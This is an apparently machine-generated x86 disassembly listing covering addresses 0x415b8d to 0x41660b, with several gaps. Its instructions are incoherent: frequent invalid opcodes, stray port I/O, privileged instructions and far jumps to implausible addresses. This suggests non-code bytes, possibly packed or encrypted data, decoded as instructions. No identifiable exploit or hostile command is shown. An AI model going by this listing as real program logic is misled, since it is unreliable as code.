  415b8d:	lods   eax,DWORD PTR ds:[esi]
  415b8e:	xchg   ecx,eax
  415b8f:	mov    edx,DWORD PTR [ebx-0x6a843e80]
  415b95:	dec    ebp
  415b96:	xor    eax,0xa504ad33
  415b9b:	daa    
  415b9c:	inc    esi
  415b9d:	dec    ebp
  415b9e:	inc    ecx
  415b9f:	pop    eax
  415ba0:	xchg   edi,eax
  415ba1:	sub    al,0x44
  415ba3:	mov    edx,0xc3412fed
  415ba8:	jge    0x415bb5
  415baa:	add    cx,WORD PTR [esi-0x17769932]
  415bb1:	(bad)  
  415bb2:	inc    edx
  415bb3:	stos   BYTE PTR es:[edi],al
  415bb4:	lock push esi
  415bb6:	ss (bad) 
  415bb8:	popa   
  415bb9:	push   ebx
  415bba:	rcr    BYTE PTR [ebx],cl
  415bbc:	int    0xda
  415bbe:	dec    BYTE PTR [ecx-0x31]
  415bc1:	xchg   edi,eax
  415bc2:	mov    edi,ds
  415bc4:	mov    dl,0x64
  415bc6:	dec    edx
  415bc7:	les    eax,FWORD PTR [eax]
  415bc9:	push   eax
  415bca:	dec    ecx
  415bcb:	cmp    eax,DWORD PTR cs:[ecx]
  415bce:	jb     0x415b68
  415bd0:	xor    eax,0x345e73d9
  415bd5:	in     al,dx
  415bd6:	jno    0x415b81
  415bd8:	ins    BYTE PTR es:[edi],dx
  415bd9:	sub    eax,0x13e72571
  415bde:	push   ebp
  415bdf:	es mov ah,0xa
  415be2:	iret   
  415be3:	or     eax,0x9083527a
  415be8:	retf   0xdc92
  415beb:	mov    WORD PTR [edx+edi*2-0x2f],cs
  415bef:	sub    ebp,ebx
  415bf1:	jecxz  0x415c5f
  415bf3:	cld    
  415bf4:	inc    edx
  415bf5:	jo     0x415b7f
  415bf7:	push   edi
  415bf8:	div    BYTE PTR [edx]
  415bfa:	hlt    
  415bfb:	sbb    al,0x91
  415bfd:	sub    BYTE PTR [eax],ah
  415bff:	cmc    
  415c00:	jecxz  0x415c75
  415c02:	pop    esp
  415c03:	in     al,dx
  415c04:	int    0xc2
  415c06:	adc    eax,0x2c9451d
  415c0b:	xor    BYTE PTR ss:[edi],0xc2
  415c0f:	jns    0x415c46
  415c11:	gs aas 
  415c13:	fmul   QWORD PTR [esi-0x582981c8]
  415c19:	mov    eax,ds
  415c1b:	sub    ecx,DWORD PTR [ebx]
  415c1d:	or     DWORD PTR [ebp+0xe],0x79
  415c21:	mov    dl,0x62
  415c23:	int    0x44
  415c25:	fdivr  QWORD PTR [ecx]
  415c27:	and    eax,edx
  415c29:	test   al,0x64
  415c2b:	sbb    DWORD PTR [edx+0xd97332b],0x4e516cd7
  415c35:	mov    ebx,0x3d58a071
  415c3a:	cmc    
  415c3b:	mov    ecx,0x451a4ee7
  415c40:	or     eax,0xcd241032
  415c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c46:	ror    al,cl
  415c48:	sub    ecx,DWORD PTR [ebp-0x17b34cac]
  415c4e:	add    DWORD PTR [esi],esi
  415c50:	and    dl,BYTE PTR [edi-0x11]
  415c53:	push   eax
  415c54:	adc    al,0xd4
  415c56:	mov    ch,0x8a
  415c58:	stos   DWORD PTR es:[edi],eax
  415c59:	ds push ds
  415c5b:	pop    ecx
  415c5c:	mov    WORD PTR [ecx-0x21a7b43b],ds
  415c62:	pop    ecx
  415c63:	adc    ebp,ecx
  415c65:	xor    al,0xee
  415c67:	shl    DWORD PTR [eax-0x41],1
  415c6a:	jmp    0x75f2a205
  415c6f:	inc    eax
  415c70:	das    
  415c71:	jb     0x415c7e
  415c73:	bound  esi,QWORD PTR [esi+0x4a6dc447]
  415c79:	mov    BYTE PTR [esp+ecx*2+0x3d],dl
  415c7d:	add    eax,0xf1541210
  415c82:	mov    DWORD PTR [ebp+0x46afa037],edx
  415c88:	mov    ebx,0xce24638b
  415c8d:	stc    
  415c8e:	cs pop eax
	...
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x49e76d1f
  415d03:	pop    ebx
  415d04:	inc    eax
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0x6f000001,al
  415d0d:	mov    ecx,0x18553fc3
  415d12:	xchg   dl,ch
  415d14:	inc    edi
  415d15:	mov    WORD PTR [eax+eax*1-0x75],ss
  415d19:	data16 add al,0x86
  415d1c:	jbe    0x415caf
  415d1e:	sahf   
  415d1f:	icebp  
  415d20:	jnp    0x415d63
  415d22:	jecxz  0x415cb3
  415d24:	add    BYTE PTR [edx+0x752487c4],bh
  415d2a:	aaa    
  415d2b:	or     al,0x70
  415d2d:	xchg   dh,cl
  415d2f:	rcl    DWORD PTR [ecx],cl
  415d31:	add    eax,0xd1d0361
  415d36:	sar    bh,0xe6
  415d39:	xlat   BYTE PTR ds:[ebx]
  415d3a:	mov    al,ds:0x8a1ce055
  415d3f:	sbb    al,0x3e
  415d41:	sbb    eax,ebp
  415d43:	xchg   edi,eax
  415d44:	lods   eax,DWORD PTR ds:[esi]
  415d45:	and    edx,DWORD PTR ds:[edx-0x3c]
  415d49:	stos   DWORD PTR es:[edi],eax
  415d4a:	pinsrw mm5,esi,0x3a
  415d4e:	fcomp  DWORD PTR [ebx+0x2d]
  415d51:	int    0x1c
  415d53:	jne    0x415d37
  415d55:	scas   al,BYTE PTR es:[edi]
  415d56:	add    eax,0xc5846d00
  415d5b:	int3   
  415d5c:	mov    bh,0x57
  415d5e:	mov    ecx,DWORD PTR [edx]
  415d60:	mov    dh,0x96
  415d62:	mov    BYTE PTR [eax],dh
  415d64:	pop    es
  415d65:	or     edi,DWORD PTR [ebp-0x55fb3723]
  415d6b:	outs   dx,DWORD PTR ds:[esi]
  415d6c:	repz (bad) 
  415d6e:	or     edi,eax
  415d70:	lea    edx,[eax+0x6c]
  415d73:	cmp    esp,DWORD PTR [edx+0x364f538c]
  415d79:	or     eax,0xd63bd059
  415d7e:	outs   dx,DWORD PTR ds:[esi]
  415d7f:	out    dx,eax
  415d80:	or     BYTE PTR [ebx-0x712f1991],bl
  415d86:	ds pop ss
  415d88:	inc    esp
  415d89:	or     edi,ebx
  415d8b:	mov    cl,0xde
  415d8d:	pop    ss
  415d8e:	lods   eax,DWORD PTR ds:[esi]
  415d8f:	bound  esp,QWORD PTR [ebx-0x15]
  415d92:	sbb    ch,bl
  415d94:	shl    DWORD PTR [edx],0x9d
  415d97:	int3   
  415d98:	fs xchg esi,eax
  415d9a:	sbb    ebx,DWORD PTR ds:0xf0db8de
  415da0:	stos   DWORD PTR es:[edi],eax
  415da1:	jg     0x415dbf
  415da3:	jge    0x415d76
  415da5:	and    eax,0xe7d8aba6
  415daa:	sub    BYTE PTR [ecx],ah
  415dac:	add    BYTE PTR [eax+edx*4-0x2e],dl
  415db0:	inc    ecx
  415db1:	out    0x1d,eax
  415db3:	sub    bh,BYTE PTR [edi+0x5cefff0c]
  415db9:	mov    ?,WORD PTR [eax]
  415dbb:	fcom   DWORD PTR [si]
  415dbe:	mov    ebp,0xd1335e5f
  415dc3:	add    BYTE PTR [ecx+0x13],bl
  415dc6:	pop    es
  415dc7:	pop    esp
  415dc8:	pminub mm2,QWORD PTR [ecx+eax*2-0x43]
  415dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dce:	lods   eax,DWORD PTR ds:[esi]
  415dcf:	pop    esi
  415dd0:	inc    esi
  415dd1:	pop    ds
  415dd2:	inc    ebx
  415dd3:	das    
  415dd4:	inc    esi
  415dd5:	not    BYTE PTR [edi+0x34]
  415dd8:	cmp    DWORD PTR [edi-0x4b],edx
  415ddb:	push   esi
  415ddc:	sub    al,0xd
  415dde:	cmp    bl,ah
  415de0:	jl     0x415d85
  415de2:	div    BYTE PTR [ebx-0x61456ca7]
  415de8:	push   esp
  415de9:	cmp    BYTE PTR [ecx+0x71],ch
  415dec:	cmp    al,BYTE PTR [ecx+edx*4]
  415def:	shl    BYTE PTR [ebx-0x78da256],cl
  415df5:	mov    cs,WORD PTR [ebp+0x1d]
  415df8:	and    DWORD PTR [ecx],esi
  415dfa:	mov    BYTE PTR [eax],bl
  415dfc:	and    ah,ch
  415dfe:	mov    DWORD PTR [esi],esp
  415e00:	pinsrw mm2,esi,0xde
  415e04:	call   0x58e67c90
  415e09:	sbb    eax,0xddd77bcf
  415e0e:	outs   dx,BYTE PTR ds:[esi]
  415e0f:	daa    
  415e10:	mov    ecx,0x0
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x1c]
  415e81:	cmp    eax,0xe74581bd
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    eax,0xc5000001
  415e8d:	jo     0x415eab
  415e8f:	dec    ebx
  415e90:	test   DWORD PTR [edi],ebp
  415e92:	fstp   TBYTE PTR [edx]
  415e94:	or     al,cl
  415e96:	fdivr  st(0),st
  415e98:	xchg   ecx,eax
  415e99:	jno    0x415ec8
  415e9b:	pop    ebp
  415e9c:	gs dec esp
  415e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e9f:	sub    dh,BYTE PTR [edx+0x5706c1fa]
  415ea5:	push   edi
  415ea6:	enter  0xf2f4,0x9
  415eaa:	add    BYTE PTR [edx+0x122138d7],dh
  415eb0:	or     bh,BYTE PTR [edx]
  415eb2:	loope  0x415e8d
  415eb4:	jb     0x415e3a
  415eb6:	hlt    
  415eb7:	test   BYTE PTR [eax],cl
  415eb9:	xor    al,0xf3
  415ebb:	mov    bh,0xb7
  415ebd:	stos   DWORD PTR es:[edi],eax
  415ebe:	or     ebp,eax
  415ec0:	cdq    
  415ec1:	xor    ah,BYTE PTR [ebx]
  415ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ec4:	and    edi,esi
  415ec6:	addr16 mov al,0x32
  415ec9:	adc    DWORD PTR [edx-0x69ba8d83],ebp
  415ecf:	pushf  
  415ed0:	stc    
  415ed1:	lea    ecx,[edi-0x65d7ddd0]
  415ed7:	dec    ebp
  415ed8:	sub    dl,bl
  415eda:	icebp  
  415edb:	dec    ecx
  415edc:	(bad)  [edi+ebx*4+0xe3d91c4]
  415ee3:	ins    DWORD PTR es:[edi],dx
  415ee4:	loop   0x415e94
  415ee6:	outs   dx,DWORD PTR ds:[esi]
  415ee7:	jno    0x415e88
  415ee9:	ror    DWORD PTR [edi-0x49],cl
  415eec:	push   ebx
  415eed:	repz repz std 
  415ef0:	(bad)  
  415ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ef2:	mov    edi,DWORD PTR [edx-0x39d8b9f3]
  415ef8:	pop    edx
  415ef9:	sbb    BYTE PTR [ebp-0x9c2b1c5],0x31
  415f00:	adc    BYTE PTR [esi-0x717fbe69],0x21
  415f07:	jmp    0x415f15
  415f09:	dec    ebp
  415f0a:	cmp    eax,0x7a465d0b
  415f0f:	mov    bh,0xa4
  415f11:	lock ret 0x197e
  415f15:	aam    0xfa
  415f17:	aaa    
  415f18:	je     0x415eeb
  415f1a:	in     eax,dx
  415f1b:	jb     0x415f66
  415f1d:	or     edx,0x1072b1e9
  415f23:	add    bl,BYTE PTR [ebx-0x680ca1d]
  415f29:	in     eax,dx
  415f2a:	xchg   DWORD PTR [edx+edx*8],esp
  415f2d:	push   eax
  415f2e:	dec    esi
  415f2f:	jge    0x415fa7
  415f31:	and    dl,BYTE PTR [esi-0x2fe2e0c8]
  415f37:	cld    
  415f38:	jbe    0x415f28
  415f3a:	jnp    0x415ef8
  415f3c:	jge    0x415f2b
  415f3e:	repnz out 0x48,al
  415f41:	and    DWORD PTR [ebp-0x43e90d38],ecx
  415f47:	pop    ds
  415f48:	push   ds
  415f49:	imul   esi,DWORD PTR [ecx],0x8fb1f57a
  415f4f:	ds pop ecx
  415f51:	add    bl,ah
  415f53:	retf   0x6084
  415f56:	cmp    bh,0x9f
  415f59:	cmp    BYTE PTR [esi+0x4a],ch
  415f5c:	sbb    ebp,esp
  415f5e:	mov    dl,0x46
  415f60:	dec    esp
  415f61:	out    dx,al
  415f62:	or     dh,dl
  415f64:	mov    DWORD PTR [edi],0x7ee8ee08
  415f6a:	aas    
  415f6b:	call   0x36e2:0xbcd40d60
  415f72:	mov    al,0xa4
  415f74:	iret   
  415f75:	shr    BYTE PTR [edx],cl
  415f77:	out    dx,al
  415f78:	data16 test al,0xed
  415f7b:	jo     0x415f40
  415f7d:	xchg   esp,eax
  415f7e:	add    eax,0x70117da0
  415f83:	jp     0x415fbf
  415f85:	sbb    esp,DWORD PTR [ebx]
  415f87:	mov    ecx,0x801d4049
  415f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8d:	mov    bh,0xe8
  415f8f:	mov    cl,0xaa
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	sbb    ebx,ebp
  416002:	and    cl,dl
  416004:	dec    edx
  416005:	call   0x146600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	sub    cl,BYTE PTR [esi+0x16]
  41600f:	repnz stc 
  416011:	je     0x415fd5
  416013:	add    ah,ah
  416015:	push   cs
  416016:	push   edx
  416017:	daa    
  416018:	fild   WORD PTR [ebp+0x140f9f25]
  41601e:	std    
  41601f:	jo     0x41608b
  416021:	dec    edi
  416022:	push   esi
  416023:	push   ecx
  416024:	je     0x415ffd
  416026:	and    DWORD PTR [ecx+ecx*1+0x10],eax
  41602a:	push   ds
  41602b:	in     al,0xfa
  41602d:	loope  0x415fdd
  41602f:	inc    eax
  416030:	leave  
  416031:	mov    esp,DWORD PTR [ebx+0x8]
  416034:	sub    eax,0xe9729f61
  416039:	add    al,0x33
  41603b:	push   0xffffffcd
  41603d:	shl    DWORD PTR [ebp+eax*4-0x19],1
  416041:	popf   
  416042:	mov    ecx,0xe074f23c
  416047:	ins    BYTE PTR es:[edi],dx
  416048:	in     eax,0x2
  41604a:	xor    ebp,DWORD PTR [edi-0x7c9f67b2]
  416050:	inc    edx
  416051:	imul   ecx,DWORD PTR gs:[esi-0x79d61771],0x8c01ccbd
  41605c:	mov    dh,0xbc
  41605e:	in     eax,0x83
  416060:	pop    esp
  416061:	fild   QWORD PTR [eax+0x27]
  416064:	xchg   edi,eax
  416065:	sub    al,0x8b
  416067:	fnstsw WORD PTR [esi+edi*2]
  41606a:	inc    esp
  41606b:	mov    al,0x40
  41606d:	(bad)  
  41606e:	mov    edx,0x98b6148a
  416073:	mov    ebx,0xb0d288c1
  416078:	ret    
  416079:	sub    esp,DWORD PTR [edi]
  41607b:	enter  0xc16,0x3c
  41607f:	pop    edi
  416080:	jp     0x4160c3
  416082:	mov    ebx,0xf374266c
  416087:	loope  0x4160e2
  416089:	mov    BYTE PTR [ebx-0x4a1a32b0],dh
  41608f:	pop    ebx
  416090:	push   esp
  416091:	rol    BYTE PTR [ebp-0x6cbd8aae],cl
  416097:	sub    eax,0x56fd8664
  41609c:	nop
  41609d:	out    dx,eax
  41609e:	out    0xb2,eax
  4160a0:	cmp    BYTE PTR [ecx-0x42],bh
  4160a3:	rol    DWORD PTR [ebx],cl
  4160a5:	xchg   edi,eax
  4160a6:	aam    0xec
  4160a8:	retf   
  4160a9:	sahf   
  4160aa:	mov    dh,0xd1
  4160ac:	aam    0x3e
  4160ae:	cmp    eax,0x125ef88
  4160b3:	femms  
  4160b5:	in     eax,0x9d
  4160b7:	retf   0x4070
  4160ba:	sbb    eax,0x3721bb15
  4160bf:	popf   
  4160c0:	xchg   esi,eax
  4160c1:	test   BYTE PTR [ebp+0x47],bh
  4160c4:	retf   
  4160c5:	push   es
  4160c6:	push   edi
  4160c7:	sub    DWORD PTR [ecx+0x5ac96e4],edi
  4160cd:	fs enter 0x1a47,0x97
  4160d2:	sbb    BYTE PTR [ebp+0x2f4a6209],0xf0
  4160d9:	hlt    
  4160da:	mov    cl,0x52
  4160dc:	add    al,0xab
  4160de:	jg     0x416133
  4160e0:	push   cs
  4160e1:	mov    dh,0x33
  4160e3:	je     0x4160e4
  4160e5:	bound  ecx,QWORD PTR [ebp+0x61f37e4d]
  4160eb:	int3   
  4160ec:	lods   al,BYTE PTR ds:[esi]
  4160ed:	pusha  
  4160ee:	clc    
  4160ef:	fstp   DWORD PTR [edi-0x673030bf]
  4160f5:	dec    edi
  4160f6:	or     DWORD PTR [ebp+0x37],edx
  4160f9:	retf   
  4160fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160fb:	test   BYTE PTR [edi],ch
  4160fd:	dec    ebp
  4160fe:	mov    bh,0x61
  416100:	cmp    DWORD PTR [edi],ebp
  416102:	push   0x6920ac42
  416107:	pop    ecx
  416108:	or     ah,BYTE PTR [ebp+0x7c0e47bc]
  41610e:	xor    eax,0x9baf
	...
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x42c46df3
  416183:	xor    cl,BYTE PTR [edi-0x17]
  416186:	add    BYTE PTR [eax],al
  416188:	add    eax,0xcb000001
  41618d:	jae    0x4161e7
  41618f:	xchg   BYTE PTR [edi-0x5c],al
  416192:	push   edx
  416193:	mov    al,ds:0xdb24fa62
  416198:	sbb    DWORD PTR [edi-0x1056ebb],0x75
  41619f:	fnstsw WORD PTR [ebp+0x6a90955d]
  4161a5:	fisub  WORD PTR [edx+0x54f5261f]
  4161ab:	je     0x416192
  4161ad:	xor    BYTE PTR [eax+0x6ee684e3],bl
  4161b3:	xor    dl,BYTE PTR [ebx-0x1]
  4161b6:	data16 ja 0x41616d
  4161b9:	jb     0x416189
  4161bb:	mov    al,0x67
  4161bd:	dec    ecx
  4161be:	sub    eax,0xb2f9ab9c
  4161c3:	pop    ebp
  4161c4:	cmp    DWORD PTR [ebp-0xb],0x28
  4161c8:	popf   
  4161c9:	pop    ecx
  4161ca:	sbb    ah,dl
  4161cc:	fs jl  0x4161b1
  4161cf:	sub    ebp,DWORD PTR [edx+0x39]
  4161d2:	pop    DWORD PTR [edi+ebx*8]
  4161d5:	mov    dh,0x34
  4161d7:	pop    edx
  4161d8:	fist   WORD PTR [ecx+ecx*4+0x6]
  4161dc:	or     eax,0x1515d207
  4161e1:	sub    al,0x40
  4161e3:	fs jp  0x416174
  4161e6:	mov    BYTE PTR [ebx+0x5f511af5],dl
  4161ec:	mov    eax,0x5b4e2033
  4161f1:	xchg   esp,esi
  4161f3:	imul   edx,DWORD PTR [ebx-0x53244b99],0xffffffc9
  4161fa:	jle    0x41624c
  4161fc:	push   0xcbaaa3c1
  416201:	cmp    eax,0x78b2e762
  416206:	and    al,0xa5
  416208:	sti    
  416209:	out    0x84,al
  41620b:	cli    
  41620c:	xchg   ch,bh
  41620e:	mulps  xmm6,XMMWORD PTR [ecx-0x75]
  416212:	ds mov bh,0xd8
  416215:	or     edx,edx
  416217:	and    eax,0x25bc262
  41621c:	sbb    al,0xa0
  41621e:	fwait
  41621f:	in     al,dx
  416220:	frstor [edi+0x4b]
  416223:	cmc    
  416224:	jno    0x416253
  416226:	popa   
  416227:	jg     0x416275
  416229:	jnp    0x41623c
  41622b:	dec    edi
  41622c:	cmp    BYTE PTR [edx+0x76dfc52f],dh
  416232:	mov    ebx,0xbbe7573c
  416237:	sbb    ebp,edi
  416239:	sbb    ebx,DWORD PTR [ebp-0x13]
  41623c:	push   esp
  41623d:	jp     0x416213
  41623f:	jno    0x4161cf
  416241:	mov    esi,0x9c0f6e86
  416246:	iret   
  416247:	enter  0x6e84,0x1f
  41624b:	pop    ecx
  41624c:	out    dx,eax
  41624d:	out    dx,eax
  41624e:	stos   BYTE PTR es:[edi],al
  41624f:	sub    ch,BYTE PTR [eax+ebx*1-0x7abd3b41]
  416256:	mov    DWORD PTR [esi+0x53],ebx
  416259:	xchg   ebp,eax
  41625a:	sub    ebx,DWORD PTR [ebp+ebx*1+0x1a9abf5c]
  416261:	stc    
  416262:	rol    DWORD PTR [esi-0x1b],0x25
  416266:	leave  
  416267:	je     0x4162ab
  416269:	push   ds
  41626a:	cmc    
  41626b:	inc    edi
  41626c:	cmp    al,0x81
  41626e:	sub    eax,0x5b997e15
  416273:	loope  0x41625c
  416275:	repnz inc ecx
  416277:	icebp  
  416278:	push   0x18
  41627a:	sbb    edi,DWORD PTR [esi+0x62505f2b]
  416280:	(bad)  
  416281:	in     eax,0xd9
  416283:	sbb    BYTE PTR [esi+0x19],0x4c
  416287:	ret    0xddfa
  41628a:	and    esp,ebx
  41628c:	repnz cdq 
  41628e:	sbb    ch,ah
  416290:	out    dx,al
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5444:0x1232fdee
  416305:	jmp    0x0:0x1050000
  41630c:	clc    
  41630d:	rcl    eax,cl
  41630f:	mov    edi,0x8a6b6102
  416314:	dec    edi
  416315:	hlt    
  416316:	(bad)  
  416317:	xchg   edx,eax
  416318:	dec    ebp
  416319:	ret    0xebb0
  41631c:	out    dx,al
  41631d:	test   eax,0x13178fec
  416322:	xor    eax,0x67b4e7c7
  416327:	out    dx,eax
  416328:	scas   al,BYTE PTR es:[edi]
  416329:	lods   eax,DWORD PTR ds:[esi]
  41632a:	inc    esp
  41632b:	mov    ds:0x68cdadc7,eax
  416330:	lods   eax,DWORD PTR ds:[esi]
  416331:	test   eax,0xea3d4a75
  416336:	and    esi,DWORD PTR [eax-0x7a]
  416339:	shl    DWORD PTR [esi+0x72],1
  41633c:	data16 cmp al,0xf1
  41633f:	mov    esp,0xe9b11e2c
  416344:	pop    ebx
  416345:	jno    0x416300
  416347:	test   eax,0xe364db3d
  41634c:	scas   al,BYTE PTR es:[edi]
  41634d:	dec    ecx
  41634e:	xchg   esp,eax
  41634f:	shr    BYTE PTR [ebx],1
  416351:	xor    eax,0x690cd84d
  416356:	lods   al,BYTE PTR ds:[esi]
  416357:	cs pop ebp
  416359:	mov    bl,BYTE PTR [ecx]
  41635b:	add    eax,0x1aeae63d
  416360:	mov    ah,ah
  416362:	(bad)  
  416363:	push   esi
  416364:	(bad)  
  416365:	shr    esp,cl
  416367:	cmp    ecx,DWORD PTR [edi+0xb]
  41636a:	out    dx,al
  41636b:	jmp    0xad8b:0xf630ac80
  416372:	out    dx,eax
  416373:	js     0x4163ce
  416375:	adc    ebp,DWORD PTR ds:[ecx-0x46]
  416379:	ins    DWORD PTR es:[edi],dx
  41637a:	stc    
  41637b:	imul   edx,DWORD PTR ss:[edi-0x31],0x34
  416380:	or     BYTE PTR [eax+ebp*4+0x5d],0xb9
  416385:	fmul   QWORD PTR [esi]
  416387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416388:	ret    0x7f64
  41638b:	sub    BYTE PTR [esi-0x50406f33],ch
  416391:	jns    0x41631f
  416393:	pusha  
  416394:	jecxz  0x416342
  416396:	ss push edi
  416398:	cmp    DWORD PTR [ebp+0x646ee7a9],0x8d64e6a2
  4163a2:	pop    esp
  4163a3:	xor    edi,DWORD PTR [eax+0x4b]
  4163a6:	cmp    eax,0x69c078c9
  4163ab:	sbb    edi,DWORD PTR [ebx+0x2d824e66]
  4163b1:	xchg   ebp,eax
  4163b2:	retf   0x6192
  4163b5:	xlat   BYTE PTR ds:[ebx]
  4163b6:	adc    dh,BYTE PTR [ecx+eiz*4-0x7c2a5aab]
  4163bd:	adc    DWORD PTR [ecx],edx
  4163bf:	xchg   ecx,eax
  4163c0:	dec    esp
  4163c1:	rol    BYTE PTR [ebx],1
  4163c3:	and    bl,cl
  4163c5:	push   esi
  4163c6:	xchg   edi,ecx
  4163c8:	hlt    
  4163c9:	mov    DWORD PTR [edx-0x3ad497f4],edx
  4163cf:	outs   dx,BYTE PTR ds:[esi]
  4163d0:	xchg   ecx,eax
  4163d1:	add    eax,0x3a93d70
  4163d6:	iret   
  4163d7:	fisubr WORD PTR [ebx]
  4163d9:	adc    DWORD PTR [edi-0x16d49fdf],esp
  4163df:	mov    ecx,0x2694e3c9
  4163e4:	jns    0x41637f
  4163e6:	and    eax,0xe7f7e924
  4163eb:	xchg   DWORD PTR [edx+0x68],ebp
  4163ee:	das    
  4163ef:	iret   
  4163f0:	push   0x333224d3
  4163f5:	(bad)  
  4163f6:	repnz test DWORD PTR [eax],edx
  4163f9:	xor    dh,ch
  4163fb:	daa    
  4163fc:	es xchg al,dl
  4163ff:	scas   eax,DWORD PTR es:[edi]
  416400:	pop    esi
  416401:	lea    ebp,[ebp-0x1c468003]
  416407:	pushf  
  416408:	out    dx,al
  416409:	mov    WORD PTR [edx],cs
  41640b:	jmp    0x38593a3a
  416410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	mov    cl,BYTE PTR [eax]
  416482:	cmp    BYTE PTR [ecx],0x59
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x69000001,al
  41648d:	iret   
  41648e:	test   al,0x84
  416490:	ins    BYTE PTR es:[edi],dx
  416491:	lea    edi,[edi+0x61938988]
  416497:	cdq    
  416498:	jne    0x4164ef
  41649a:	retf   
  41649b:	std    
  41649c:	daa    
  41649d:	div    DWORD PTR [ecx+0x2d03af6e]
  4164a3:	test   al,0xd4
  4164a5:	jnp    0x416445
  4164a7:	jb     0x416513
  4164a9:	mov    al,ds:0x18e6678b
  4164ae:	or     ebx,0x8dd61739
  4164b4:	stos   BYTE PTR es:[edi],al
  4164b5:	(bad)  
  4164b6:	out    dx,al
  4164b7:	mov    eax,ds:0x9a62dd7b
  4164bc:	xchg   esp,eax
  4164bd:	cmc    
  4164be:	add    al,0x2e
  4164c0:	inc    ecx
  4164c1:	mov    WORD PTR [esi+0x10],gs
  4164c4:	jbe    0x416512
  4164c6:	hlt    
  4164c7:	in     al,0x35
  4164c9:	add    DWORD PTR [esi],esi
  4164cb:	mov    edx,0xea063023
  4164d0:	jp     0x416529
  4164d2:	xchg   ecx,eax
  4164d3:	shl    BYTE PTR [eax+ebx*4-0x7f],1
  4164d7:	pop    ss
  4164d8:	fidivr WORD PTR [eax+0x7b]
  4164db:	and    DWORD PTR [edx+ebp*8-0x13ebb419],esp
  4164e2:	clc    
  4164e3:	xor    ebp,DWORD PTR [ecx+esi*1]
  4164e6:	addr16 add al,0xad
  4164e9:	ss jecxz 0x416560
  4164ec:	pop    edi
  4164ed:	fwait
  4164ee:	push   edi
  4164ef:	jno    0x416534
  4164f1:	mov    dh,0xe1
  4164f3:	sbb    ah,BYTE PTR [esi+0x47]
  4164f6:	adc    bh,BYTE PTR [esi]
  4164f8:	or     DWORD PTR [esi],0x365440a1
  4164fe:	and    ecx,DWORD PTR [esi]
  416500:	push   ds
  416501:	add    BYTE PTR [edx+0x6d],ah
  416504:	push   ds
  416505:	sahf   
  416506:	pop    eax
  416507:	mov    eax,ds:0xd3eda3b6
  41650c:	push   ecx
  41650d:	ficomp WORD PTR [edx+edx*4+0xa]
  416511:	nop
  416512:	or     eax,0xad872414
  416517:	js     0x4164c6
  416519:	mov    esp,DWORD PTR [ecx-0x78872af4]
  41651f:	mov    edx,0x99689264
  416524:	shr    DWORD PTR [ecx-0x40],1
  416527:	adc    cl,BYTE PTR [ecx-0x1c0bcae5]
  41652d:	loopne 0x41655b
  41652f:	cmc    
  416530:	leave  
  416531:	jmp    0x8e6591fc
  416536:	gs push ebx
  416538:	aaa    
  416539:	add    ecx,DWORD PTR [ecx]
  41653b:	in     eax,0x7f
  41653d:	popf   
  41653e:	mov    dl,0xf
  416540:	rcl    ebp,0x54
  416543:	jmp    0x4164cc
  416545:	jmp    0x4164e8
  416547:	sub    al,0x79
  416549:	(bad)  
  41654a:	lods   al,BYTE PTR ds:[esi]
  41654b:	outs   dx,DWORD PTR ds:[esi]
  41654c:	in     eax,0x37
  41654e:	sbb    BYTE PTR [esi-0x7845b64f],al
  416554:	inc    ebx
  416555:	enter  0xa219,0xdb
  416559:	or     eax,0xb03e6157
  41655e:	sbb    esi,ecx
  416560:	or     BYTE PTR [ecx],ch
  416562:	and    DWORD PTR [ebx+0x3fc9c219],edi
  416568:	ins    DWORD PTR es:[edi],dx
  416569:	pop    ebx
  41656a:	push   ebx
  41656b:	test   al,0x10
  41656d:	jp     0x41654f
  41656f:	stos   DWORD PTR es:[edi],eax
  416570:	scas   eax,DWORD PTR es:[edi]
  416571:	mov    ?,WORD PTR [ebx+ecx*4+0x61]
  416575:	dec    BYTE PTR [ebx+0x58e5c846]
  41657b:	repnz mov ebx,0xcee1873d
  416581:	jne    0x41655d
  416583:	inc    esi
  416584:	and    eax,0x1b114730
  416589:	mov    ebx,0x1c3629e7
  41658e:	fiadd  WORD PTR [esi-0x22]
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x634fbcac]
  416601:	add    DWORD PTR [eax+0xec5e01],0x10500
  41660b:	add    bl,cl
